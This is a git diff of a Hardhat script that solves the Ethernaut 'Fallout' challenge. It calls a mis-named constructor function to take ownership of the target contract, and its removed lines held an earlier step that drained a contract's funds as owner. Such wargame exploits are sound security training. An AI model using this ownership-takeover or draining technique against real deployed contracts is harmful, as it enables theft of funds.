@@ -3,82 +3,73 @@ import { ethers } from "hardhat";
 
 const attackFallout = async () => {
     // change contract addresses here.
-    const falloutAddress = "0x25d44eB1C5F7Ea6d32B11c7a28A5dBB9251f3417"; //type "await contract.address()" in ethernaut console
+    const falloutAddress = "0xe3958F5f3E7C470c3F0a9d680C9C0670D9688a66"; //type "await contract.address()" in ethernaut console
     const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here
 
     // Don't touch below 🚀
-    // Vulnerability from public view of password
+    // Vulnerability from mistake of making a function not a constructor. Can call function to become the owner.
     // additional read:
-    // https://web3js.readthedocs.io/en/v1.5.2/web3-utils.html#towei
-    // https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity/81995
+    // https://docs.soliditylang.org/en/v0.8.10/contracts.html
     // typing all commands in console below
     // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
     const ABI = [
         {
             inputs: [],
-            stateMutability: "nonpayable",
-            type: "constructor",
-            constant: undefined,
-            payable: undefined,
-        },
-        {
-            inputs: [],
-            name: "contribute",
+            name: "Fal1out",
             outputs: [],
             payable: true,
             stateMutability: "payable",
             type: "function",
         },
         {
-            inputs: [{ internalType: "address", name: "", type: "address" }],
-            name: "contributions",
+            inputs: [],
+            name: "allocate",
+            outputs: [],
+            stateMutability: "payable",
+            type: "function",
+        },
+        {
+            inputs: [{ internalType: "address", name: "allocator", type: "address" }],
+            name: "allocatorBalance",
             outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
             stateMutability: "view",
             type: "function",
         },
         {
             inputs: [],
-            name: "getContribution",
-            outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
-            stateMutability: "view",
+            name: "collectAllocations",
+            outputs: [],
+            stateMutability: "nonpayable",
             type: "function",
         },
         {
             inputs: [],
             name: "owner",
-            outputs: [{ internalType: "address", name: "", type: "address" }],
+            outputs: [{ internalType: "address payable", name: "", type: "address" }],
             stateMutability: "view",
             type: "function",
         },
         {
-            inputs: [],
-            name: "withdraw",
+            inputs: [{ internalType: "address payable", name: "allocator", type: "address" }],
+            name: "sendAllocation",
             outputs: [],
             stateMutability: "nonpayable",
             type: "function",
-        },
-        {
-            constant: true,
-            name: "infoNum",
-            payable: true,
-            stateMutability: "payable",
-            type: "receive",
         },
     ];
     const contract = await ethers.getContractAt(ABI, falloutAddress);
     const ownerAddress = await contract.owner();
     console.log(`Contract Owner is: ${ownerAddress}`);
-
-    console.log("Checking that player is now owner...");
+    console.log("Activating function 'Fal1out' to become the new owner...");
+    const tx1 = await contract.Fal1out();
+    const tx1Receipt = await tx1.wait();
+    console.log(tx1Receipt);
+    console.log("Now checking that player is now owner...");
     const newOwner = await contract.owner();
     console.log(`Contract Owner is now: ${newOwner}`);
     const owner = newOwner === player;
     console.log(`Player is now owner: ${owner}`);
     if (owner) {
-        console.log("Draining contract by withdrawing as owner...");
-        const withdraw = await contract.withdraw();
-        const Receipt = await withdraw.wait(1);
-        console.log(Receipt);
         console.log("Done...submit in ethernaut");
     } else {
         console.log("Player is not owner, please review code above");
